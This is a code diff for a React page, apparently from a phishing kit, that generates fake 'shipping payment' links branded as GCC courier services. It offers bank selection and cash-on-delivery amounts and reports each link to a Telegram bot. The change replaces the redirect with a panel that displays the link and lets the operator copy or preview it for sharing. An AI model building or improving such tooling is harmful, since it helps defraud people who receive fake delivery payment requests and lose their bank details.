@@ -1,5 +1,5 @@
 import { useState, useMemo } from "react";
-import { useParams, useNavigate } from "react-router-dom";
+import { useParams } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -10,14 +10,13 @@ import { getCountryByCode } from "@/lib/countries";
 import { getServicesByCountry } from "@/lib/gccShippingServices";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getBanksByCountry } from "@/lib/banks";
-import { Package, MapPin, DollarSign, Hash, Building2 } from "lucide-react";
+import { Package, MapPin, DollarSign, Hash, Building2, Copy, Eye } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import TelegramTest from "@/components/TelegramTest";
 
 const CreateShippingLink = () => {
   const { country } = useParams();
-  const navigate = useNavigate();
   const { toast } = useToast();
   const createLink = useCreateLink();
   const countryData = getCountryByCode(country?.toUpperCase() || "");
@@ -28,6 +27,8 @@ const CreateShippingLink = () => {
   const [packageDescription, setPackageDescription] = useState("");
   const [codAmount, setCodAmount] = useState("");
   const [selectedBank, setSelectedBank] = useState("");
+  const [createdLinkUrl, setCreatedLinkUrl] = useState("");
+  const [isCopied, setIsCopied] = useState(false);
   
   // Get banks for the selected country
   const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);
@@ -45,7 +46,7 @@ const CreateShippingLink = () => {
   
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    
+
     if (!selectedService || !trackingNumber) {
       toast({
         title: "خطأ",
@@ -54,7 +55,10 @@ const CreateShippingLink = () => {
       });
       return;
     }
-    
+
+    setCreatedLinkUrl("");
+    setIsCopied(false);
+
     try {
       const link = await createLink.mutateAsync({
         type: "shipping",
@@ -65,11 +69,12 @@ const CreateShippingLink = () => {
           tracking_number: trackingNumber,
           package_description: packageDescription,
           cod_amount: parseFloat(codAmount) || 0,
-          selected_bank: selectedBank || null,
+          selected_bank: selectedBank && selectedBank !== "skip" ? selectedBank : null,
         },
       });
-      
-      // Send data to Telegram
+
+      const paymentUrl = `${window.location.origin}/r/${country}/${link.type}/${link.id}?service=${selectedService}`;
+
       const telegramResult = await sendToTelegram({
         type: 'shipping_link_created',
         data: {
@@ -78,9 +83,9 @@ const CreateShippingLink = () => {
           package_description: packageDescription,
           cod_amount: parseFloat(codAmount) || 0,
           country: countryData.nameAr,
-          payment_url: `${window.location.origin}/r/${country}/${link.type}/${link.id}?service=${selectedService}`
+          payment_url: paymentUrl,
         },
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
       });
 
       if (telegramResult.success) {
@@ -97,11 +102,44 @@ const CreateShippingLink = () => {
         });
       }
 
-      // Navigate to payment page with service parameter
-      navigate(`/pay/${link.id}/recipient?service=${selectedService}`);
+      setCreatedLinkUrl(paymentUrl);
+      setIsCopied(false);
+      toast({
+        title: "تم إنشاء الرابط",
+        description: "يمكنك نسخ الرابط أو معاينته قبل مشاركته",
+      });
     } catch (error) {
       console.error("Error creating link:", error);
+      toast({
+        title: "حدث خطأ",
+        description: "تعذر إنشاء رابط الدفع، الرجاء المحاولة مرة أخرى",
+        variant: "destructive",
+      });
     }
+  };
+
+  const handleCopyLink = async () => {
+    if (!createdLinkUrl) return;
+    try {
+      await navigator.clipboard.writeText(createdLinkUrl);
+      setIsCopied(true);
+      toast({
+        title: "تم النسخ",
+        description: "تم نسخ رابط الدفع إلى الحافظة",
+      });
+    } catch (error) {
+      console.error("Copy link error:", error);
+      toast({
+        title: "تعذر النسخ",
+        description: "حدث خطأ أثناء نسخ الرابط، حاول مرة أخرى",
+        variant: "destructive",
+      });
+    }
+  };
+
+  const handlePreviewLink = () => {
+    if (!createdLinkUrl) return;
+    window.open(createdLinkUrl, "_blank", "noopener,noreferrer");
   };
   
   if (!countryData) {
@@ -111,7 +149,9 @@ const CreateShippingLink = () => {
           <Package className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
           <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
           <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
-          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
+          <Button asChild>
+            <a href="/services">العودة للخدمات</a>
+          </Button>
         </div>
       </div>
     );
@@ -266,6 +306,35 @@ const CreateShippingLink = () => {
                 )}
               </Button>
             </form>
+
+            {createdLinkUrl && (
+              <div className="mt-6 space-y-4">
+                <div className="p-3 rounded-lg border border-dashed bg-muted/30">
+                  <p className="text-xs text-muted-foreground mb-2">الرابط الذي تم إنشاؤه</p>
+                  <p className="text-sm font-mono break-all text-foreground">{createdLinkUrl}</p>
+                </div>
+                <div className="flex flex-col sm:flex-row gap-3">
+                  <Button
+                    type="button"
+                    onClick={handleCopyLink}
+                    className="flex-1 py-4"
+                    variant={isCopied ? "secondary" : "default"}
+                  >
+                    <Copy className="w-4 h-4 ml-2" />
+                    <span>{isCopied ? "تم نسخ الرابط" : "نسخ الرابط"}</span>
+                  </Button>
+                  <Button
+                    type="button"
+                    onClick={handlePreviewLink}
+                    variant="outline"
+                    className="flex-1 py-4"
+                  >
+                    <Eye className="w-4 h-4 ml-2" />
+                    <span>معاينة الرابط</span>
+                  </Button>
+                </div>
+              </div>
+            )}
           </Card>
         </div>
       </div>
